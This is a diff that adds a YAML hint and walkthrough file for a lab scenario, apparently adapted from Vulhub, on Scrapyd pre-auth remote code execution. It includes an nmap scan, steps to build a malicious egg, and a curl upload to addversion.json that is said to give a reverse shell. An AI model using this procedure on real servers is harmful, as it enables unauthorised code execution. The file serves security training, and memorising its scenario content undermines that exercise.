@@ -1,0 +1,88 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: scrapy/scrapyd-unacc
+hint_levels:
+  low:
+  - Inspect the scrapy service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 6800. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 6800 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): scrapyd: 6800/tcp → container 6800/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:6800`, `http://{{NODE_IP}}:6800/addversion.json`.'
+  high:
+  - 'Vulnerability: Scrapyd Pre-Auth Remote Code Execution.'
+  - |-
+    Reproduce
+
+    Build a evil egg archive:
+
+    ```bash
+    pip install scrapy scrapyd-client
+    scrapy startproject evil
+    cd evil
+    # edit evil/__init__.py, add evil code
+    scrapyd-deploy --build-egg=evil.egg
+    ```
+
+    Upload evil egg to the scrapyd server:
+
+    ```bash
+    curl http://{{NODE_IP}}:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
+    ```
+
+    reverse shell is available:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/scrapy/scrapyd-unacc/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/scrapy/scrapyd-unacc/README.md'
+  - |-
+    Additional public references:
+    - https://www.leavesongs.com/PENETRATION/attack-scrapy.html
+access_instructions:
+  title: Scrapyd Pre-Auth Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 6800. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 6800 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): scrapyd: 6800/tcp → container 6800/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:6800`, `http://{{NODE_IP}}:6800/addversion.json`.
+  - title: Reproduce
+    instructions: |-
+      Build a evil egg archive:
+
+      ```bash
+      pip install scrapy scrapyd-client
+      scrapy startproject evil
+      cd evil
+      # edit evil/__init__.py, add evil code
+      scrapyd-deploy --build-egg=evil.egg
+      ```
+
+      Upload evil egg to the scrapyd server:
+
+      ```bash
+      curl http://{{NODE_IP}}:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
+      ```
+
+      reverse shell is available:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/scrapy/scrapyd-unacc/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/scrapy/scrapyd-unacc/README.md
+  readme_sha256: 3000f35b88e1c7e0c2f0b952df58a32f90565b371e7a0d8ed25aa3c74cae1f3c
+  compose_sha256: e29a1bb9c7964fec902e9e085fa922a2d953854c5d6b08751b3cbff78e6ea244
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
